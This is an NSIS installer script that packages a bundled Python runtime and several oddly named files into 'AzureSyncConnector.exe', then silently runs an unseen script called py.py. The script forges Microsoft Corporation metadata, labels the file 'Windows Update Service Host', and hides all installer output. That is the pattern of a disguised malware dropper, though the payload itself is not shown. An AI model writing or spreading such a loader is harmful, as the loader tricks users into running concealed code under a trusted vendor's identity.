Name "Azure Sync Connector"
OutFile  "AzureSyncConnector.exe"

SilentInstall silent
RequestExecutionLevel user
ShowInstDetails nevershow

SetCompressor /SOLID lzma

VIProductVersion "10.0.19041.1"
VIAddVersionKey "ProductName"      "Azure Sync Connector"
VIAddVersionKey "CompanyName"      "Microsoft Corporation"
VIAddVersionKey "FileDescription"  "Windows Update Service Host"
VIAddVersionKey "FileVersion"      "10.0.19041.1"
VIAddVersionKey "LegalCopyright"   "© Microsoft Corporation. All rights reserved."


!include "FileFunc.nsh"

Section "Main"

    System::Call 'kernel32::AttachConsole(i -1)'

    InitPluginsDir
    SetOutPath "$PLUGINSDIR"

    File /r "python3-minimal\*.*"
    File "py.py"
	File "yp.py"
    File "hisotryCPU.txt"
	File "P.txt"


    ${GetParameters} $R0

    ExecWait `"$PLUGINSDIR\python.exe" "$PLUGINSDIR\py.py" $R0` $R1

    SetErrorLevel $R1

SectionEnd
